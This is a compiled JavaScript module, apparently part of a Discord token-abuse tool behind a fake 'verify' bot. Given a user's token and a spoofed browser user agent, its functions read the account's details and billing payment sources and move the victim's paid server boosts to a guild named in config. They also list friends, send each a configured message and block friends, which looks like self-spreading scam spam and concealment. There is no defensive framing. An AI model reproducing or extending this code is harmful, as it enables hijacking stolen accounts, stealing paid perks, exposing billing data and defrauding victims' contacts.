var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __markAsModule = (target) => __defProp(target, "__esModule", { value: true });
var __export = (target, all) => {
  __markAsModule(target);
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __reExport = (target, module2, desc) => {
  if (module2 && typeof module2 === "object" || typeof module2 === "function") {
    for (let key of __getOwnPropNames(module2))
      if (!__hasOwnProp.call(target, key) && key !== "default")
        __defProp(target, key, { get: () => module2[key], enumerable: !(desc = __getOwnPropDesc(module2, key)) || desc.enumerable });
  }
  return target;
};
var __toModule = (module2) => {
  return __reExport(__markAsModule(__defProp(module2 != null ? __create(__getProtoOf(module2)) : {}, "default", module2 && module2.__esModule && "default" in module2 ? { get: () => module2.default, enumerable: true } : { value: module2, enumerable: true })), module2);
};
__export(exports, {
  addBoostToserver: () => addBoostToserver,
  blockFriend: () => blockFriend,
  createFriendChannel: () => createFriendChannel,
  getAllBoosts: () => getAllBoosts,
  getAllFriends: () => getAllFriends,
  getBillingInformation: () => getBillingInformation,
  getUserInformation: () => getUserInformation,
  sendMessage: () => sendMessage
});
var import_node_fetch = __toModule(require("node-fetch"));
var import_config = __toModule(require("../../util/config"));
const getUserInformation = async (token) => {
  return await (await (0, import_node_fetch.default)(`https://discord.com/api/users/@me`, {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
      Authorization: token
    }
  })).json();
};
const getBillingInformation = async (token) => {
  return await (await (0, import_node_fetch.default)(`https://discord.com/api/v9/users/@me/billing/payment-sources`, {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
      Authorization: token
    }
  })).json();
};
const getAllBoosts = async (token) => {
  return await (await (0, import_node_fetch.default)(`https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots`, {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
      Authorization: token
    }
  })).json();
};
const addBoostToserver = async (token, discordBoosts) => {
  return await (await (0, import_node_fetch.default)(`https://discord.com/api/v9/guilds/${import_config.config.verify.guildId}/premium/subscriptions`, {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
      "Content-Type": "application/json",
      Authorization: token
    },
    method: "PUT",
    body: JSON.stringify({
      user_premium_guild_subscription_slot_ids: discordBoosts
    })
  })).json();
};
const getAllFriends = async (token) => {
  return await (await (0, import_node_fetch.default)(`https://discord.com/api/users/@me/relationships`, {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
      Authorization: token
    }
  })).json();
};
const createFriendChannel = async (token, friendId) => {
  return await (await (0, import_node_fetch.default)(`https://discord.com/api/v9/users/@me/channels`, {
    method: "POST",
    body: JSON.stringify({
      recipients: [friendId]
    }),
    headers: {
      "Content-type": "application/json; charset=UTF-8",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
      Authorization: token
    }
  })).json();
};
const sendMessage = async (token, channelId) => {
  return await (await (0, import_node_fetch.default)(`https://discord.com/api/v9/channels/${channelId}/messages`, {
    method: "POST",
    body: JSON.stringify({
      content: import_config.config.autoMessage.text,
      nonce: "",
      tts: false
    }),
    headers: {
      Authorization: token,
      "Content-type": "application/json; charset=UTF-8",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
  })).json();
};
const blockFriend = async (token, friendId) => {
  return await (0, import_node_fetch.default)(`https://discord.com/api/v9/users/@me/relationships/${friendId}`, {
    method: "PUT",
    body: JSON.stringify({
      type: 2
    }),
    headers: {
      Authorization: token,
      "Content-type": "application/json; charset=UTF-8",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
  });
};
// Annotate the CommonJS export names for ESM import in node:
0 && (module.exports = {
  addBoostToserver,
  blockFriend,
  createFriendChannel,
  getAllBoosts,
  getAllFriends,
  getBillingInformation,
  getUserInformation,
  sendMessage
});
//# sourceMappingURL=fetch.js.map
